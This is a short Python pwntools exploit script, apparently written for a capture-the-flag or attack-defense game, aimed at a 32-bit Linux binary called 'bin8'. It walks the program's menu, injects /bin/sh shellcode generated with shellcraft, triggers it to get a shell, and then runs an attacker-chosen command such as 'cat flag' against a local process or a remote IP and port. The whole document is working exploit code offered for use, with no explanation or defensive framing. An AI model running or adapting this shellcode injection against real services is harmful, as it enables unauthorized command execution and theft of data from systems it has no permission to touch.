from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'info'

def exp(debug,binary,msg,ip=0,port=0,timeout = 1):
	if debug == 1:
		p = process(binary)
		# gdb.attach(p, 'b * 0x08048AC1\nc')
	else:
		p = remote(ip, port,timeout=timeout)
	try:
		p.recvuntil('=======================',timeout=timeout)	
		p.sendline('1')
		p.recv(1024)
		p.sendline('0')
		p.recv(1024)
		p.sendline('hh' + asm(shellcraft.sh()))
		p.recv(1024)
		p.sendline('3')
		p.recv(1024)
		p.sendline('0')

		p.sendline('echo 123')

		p.recvuntil('123',timeout=timeout)

		p.sendline(msg)

		p.sendline('echo 456')

		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()

		return flag[:-3]
	except:
		p.close()
		return ''
		

if __name__ == '__main__':
	print exp(1,'bin8','cat flag')
